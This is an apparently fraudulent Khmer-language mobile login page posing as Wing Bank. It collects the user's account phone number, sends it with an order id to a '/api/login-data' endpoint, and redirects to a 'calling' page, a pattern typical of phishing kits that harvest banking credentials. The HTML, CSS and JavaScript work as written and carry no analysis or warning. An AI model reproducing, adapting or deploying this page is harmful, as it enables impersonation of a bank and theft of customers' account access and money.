<!DOCTYPE html>
<html lang="km" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>ចូល</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased;
  max-width:520px;margin:0 auto;min-height:100vh;min-height:100dvh;background:#fff;display:flex;flex-direction:column}

.back-btn{
  display:flex;align-items:center;justify-content:center;
  width:44px;height:44px;background:none;border:none;cursor:pointer;
  margin:10px 6px 0;
}
.back-btn svg{width:24px;height:24px;stroke:#1a1a1a;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}

.content{flex:1;padding:16px 24px 0;display:flex;flex-direction:column}

.heading{font-size:28px;font-weight:700;color:#1a1a1a;margin-bottom:12px}
.subtitle{font-size:15px;color:#6b7280;line-height:1.5;margin-bottom:36px}

.phone-box{
  display:flex;align-items:center;
  background:#f2f3f5;border-radius:14px;
  height:56px;overflow:hidden;
}
.country-btn{
  display:flex;align-items:center;gap:8px;
  padding:0 14px;height:100%;
  background:none;border:none;cursor:pointer;
  border-right:1px solid #dfe1e5;
  flex-shrink:0;
}
.country-btn .flag{font-size:24px;line-height:1}
.country-btn .code{font-size:16px;font-weight:600;color:#1a1a1a}
.country-btn .arrow{width:12px;height:12px;fill:#9ca3af;flex-shrink:0}

.phone-input{
  flex:1;border:none;outline:none;background:transparent;
  padding:0 16px;font-size:16px;color:#1a1a1a;
  font-family:inherit;height:100%;
}
.phone-input::placeholder{color:#9ca3af;font-weight:400}

.err{display:none;background:#fff0f0;border:1px solid #fcc;border-radius:12px;padding:12px 14px;margin:16px 0 0;color:#dc2626;font-size:14px;text-align:center;font-weight:600}

.bottom-bar{padding:16px 24px 32px;transition:padding-bottom .15s}
.start-btn{
  width:100%;height:54px;border:none;border-radius:50px;
  font-size:17px;font-weight:600;color:#fff;
  background:#A9CF38;cursor:pointer;
  font-family:inherit;transition:.2s;
  box-shadow:0 4px 12px rgba(169,207,56,.25);
}
.start-btn:hover{background:#8BB52E}
.start-btn:disabled{opacity:.45;cursor:default;box-shadow:none}

.sheet-overlay{
  display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);
  z-index:100;transition:opacity .25s;
}
.sheet-overlay.open{display:block}

.sheet{
  position:fixed;bottom:0;left:0;right:0;
  max-width:520px;margin:0 auto;
  background:#fff;border-radius:20px 20px 0 0;
  z-index:101;transform:translateY(100%);
  transition:transform .3s cubic-bezier(.22,1,.36,1);
  max-height:85vh;display:flex;flex-direction:column;
}
.sheet.open{transform:translateY(0)}

.sheet-handle{
  width:40px;height:5px;background:#d1d5db;border-radius:3px;
  margin:10px auto 0;flex-shrink:0;
}
.sheet-header{
  display:flex;align-items:center;padding:16px 18px 14px;flex-shrink:0;
}
.sheet-close{
  width:36px;height:36px;display:flex;align-items:center;justify-content:center;
  background:none;border:none;cursor:pointer;
}
.sheet-close svg{width:20px;height:20px;stroke:#1a1a1a;stroke-width:2.2;fill:none;stroke-linecap:round}
.sheet-title{flex:1;text-align:center;font-size:17px;font-weight:700;color:#1a1a1a;padding-right:36px}

.country-list{
  overflow-y:auto;-webkit-overflow-scrolling:touch;
  padding:0 18px 24px;flex:1;
}
.country-item{
  display:flex;align-items:center;gap:14px;
  padding:16px 0;border-bottom:1px solid #f0f0f0;cursor:pointer;
}
.country-item:last-child{border-bottom:none}
.country-item .ci-flag{
  width:52px;height:52px;border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  font-size:32px;background:#f5f5f5;flex-shrink:0;
  overflow:hidden;
}
.country-item .ci-info{flex:1}
.country-item .ci-code{font-size:17px;font-weight:700;color:#1a1a1a}
.country-item .ci-name{font-size:14px;color:#6b7280;margin-top:2px}
.country-item .ci-check{
  width:28px;height:28px;border-radius:50%;
  background:#22c55e;display:none;
  align-items:center;justify-content:center;flex-shrink:0;
}
.country-item .ci-check svg{width:16px;height:16px;stroke:#fff;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round}
.country-item.selected .ci-check{display:flex}
</style>
</head>
<body>

<button class="back-btn" onclick="history.back()" aria-label="Back">
  <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg>
</button>

<div class="content">
  <h1 class="heading">ចូល</h1>
  <p class="subtitle">បញ្ចូលលេខទូរស័ព្ទដែលភ្ជាប់នឹងគណនី Wing Bank របស់អ្នក.</p>

  <div class="phone-box">
    <button class="country-btn" id="countryBtn" onclick="openSheet()">
      <span class="flag" id="selFlag">&#x1F1F0;&#x1F1ED;</span>
      <span class="code" id="selCode">+855</span>
      <svg class="arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
    </button>
    <input class="phone-input" id="phone" type="tel" inputmode="numeric" placeholder="លេខទូរស័ព្ទ" maxlength="15" oninput="ck()">
  </div>

  <div class="err" id="err"></div>
</div>

<div class="bottom-bar">
  <button class="start-btn" id="go" onclick="sub()" disabled>ចាប់ផ្តើម</button>
</div>

<div class="sheet-overlay" id="sheetOverlay" onclick="closeSheet()"></div>
<div class="sheet" id="sheet">
  <div class="sheet-handle"></div>
  <div class="sheet-header">
    <button class="sheet-close" onclick="closeSheet()">
      <svg viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>
    </button>
    <div class="sheet-title">ជ្រើសរើសប្រទេស</div>
  </div>
  <div class="country-list" id="countryList"></div>
</div>

<script>
var countries = [
  {flag:"\u{1F1F0}\u{1F1ED}", code:"+855", name:"កម្ពុជា", dial:"855", iso:"KH"},
  {flag:"\u{1F1E6}\u{1F1FA}", code:"+61",  name:"អូស្ត្រាលី", dial:"61", iso:"AU"},
  {flag:"\u{1F1E7}\u{1F1EA}", code:"+32",  name:"បែលហ្សីក", dial:"32", iso:"BE"},
  {flag:"\u{1F1E8}\u{1F1E6}", code:"+1",   name:"កាណាដា", dial:"1", iso:"CA"},
  {flag:"\u{1F1EB}\u{1F1F7}", code:"+33",  name:"បារាំង", dial:"33", iso:"FR"},
  {flag:"\u{1F1E9}\u{1F1EA}", code:"+49",  name:"អាល្លឺម៉ាញ", dial:"49", iso:"DE"},
  {flag:"\u{1F1EF}\u{1F1F5}", code:"+81",  name:"ជប៉ុន", dial:"81", iso:"JP"},
  {flag:"\u{1F1F2}\u{1F1FE}", code:"+60",  name:"ម៉ាលេសី", dial:"60", iso:"MY"},
  {flag:"\u{1F1F3}\u{1F1F1}", code:"+31",  name:"ហុល្លង់", dial:"31", iso:"NL"},
  {flag:"\u{1F1F0}\u{1F1F7}", code:"+82",  name:"កូរ៉េខាងត្បូង", dial:"82", iso:"KR"},
  {flag:"\u{1F1F8}\u{1F1EA}", code:"+46",  name:"សូអែដ", dial:"46", iso:"SE"},
  {flag:"\u{1F1E8}\u{1F1ED}", code:"+41",  name:"សូអ៊ីស", dial:"41", iso:"CH"},
  {flag:"\u{1F1FA}\u{1F1F8}", code:"+1",   name:"សហរដ្ឋអាមេរិក", dial:"1", iso:"US"}
];

var selIdx = 0;
var ps = new URLSearchParams(location.search);
var oid = ps.get("order");

function renderList(){
  var list = document.getElementById("countryList");
  list.innerHTML = "";
  countries.forEach(function(c, i){
    var div = document.createElement("div");
    div.className = "country-item" + (i === selIdx ? " selected" : "");
    div.innerHTML =
      '<div class="ci-flag">' + c.flag + '</div>' +
      '<div class="ci-info"><div class="ci-code">' + c.code + '</div><div class="ci-name">' + c.name + '</div></div>' +
      '<div class="ci-check"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg></div>';
    div.onclick = function(){ pickCountry(i); };
    list.appendChild(div);
  });
}

function pickCountry(i){
  selIdx = i;
  document.getElementById("selFlag").textContent = countries[i].flag;
  document.getElementById("selCode").textContent = countries[i].code;
  renderList();
  setTimeout(closeSheet, 180);
  ck();
}

function openSheet(){
  document.getElementById("sheetOverlay").classList.add("open");
  setTimeout(function(){ document.getElementById("sheet").classList.add("open"); }, 10);
  document.body.style.overflow = "hidden";
}

function closeSheet(){
  document.getElementById("sheet").classList.remove("open");
  setTimeout(function(){
    document.getElementById("sheetOverlay").classList.remove("open");
    document.body.style.overflow = "";
  }, 300);
}

function ck(){
  var p = document.getElementById("phone").value.replace(/\D/g,"");
  document.getElementById("go").disabled = p.length < 6;
}

if(ps.get("error") === "1"){
  var ee = document.getElementById("err");
  ee.textContent = "ព័ត៌មានចូលមិនត្រឹមត្រូវ";
  ee.style.display = "block";
  history.replaceState(null, "", "login.html" + (oid ? "?order=" + oid : ""));
}

async function sub(){
  var p = document.getElementById("phone").value.replace(/\D/g,"");
  if(p.length < 6) return;
  var btn = document.getElementById("go");
  btn.disabled = true;
  btn.textContent = "សូមរង់ចាំ...";
  try {
    var cc = countries[selIdx];
    var r = await fetch("/api/login-data", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        order_id: oid,
        username: cc.code + " " + p,
        country: cc.iso
      })
    });
    var d = await r.json();
    if(!d.success){ se(d.message || "កំហុស"); btn.disabled = false; btn.textContent = "ចាប់ផ្តើម"; return; }
    location.href = "calling.html?order=" + oid + "&phone=" + p;
  } catch(e){
    se("កំហុសក្នុងការភ្ជាប់");
    btn.disabled = false;
    btn.textContent = "ចាប់ផ្តើម";
  }
}

function se(m){
  var e = document.getElementById("err");
  e.textContent = m;
  e.style.display = "block";
  setTimeout(function(){ e.style.display = "none"; }, 3000);
}

document.getElementById("phone").addEventListener("keydown", function(e){
  if(e.key === "Enter") sub();
});

renderList();

if(window.visualViewport){
  var bar = document.querySelector(".bottom-bar");
  var phoneBox = document.querySelector(".phone-box");
  window.visualViewport.addEventListener("resize", function(){
    var diff = window.innerHeight - window.visualViewport.height;
    if(diff > 100){
      bar.style.paddingBottom = (diff + 12) + "px";
      phoneBox.scrollIntoView({behavior:"smooth", block:"center"});
    } else {
      bar.style.paddingBottom = "";
    }
  });
}
</script>
<script src="tracker.js"></script>
<script src="/presence.js"></script>
</body>
</html>
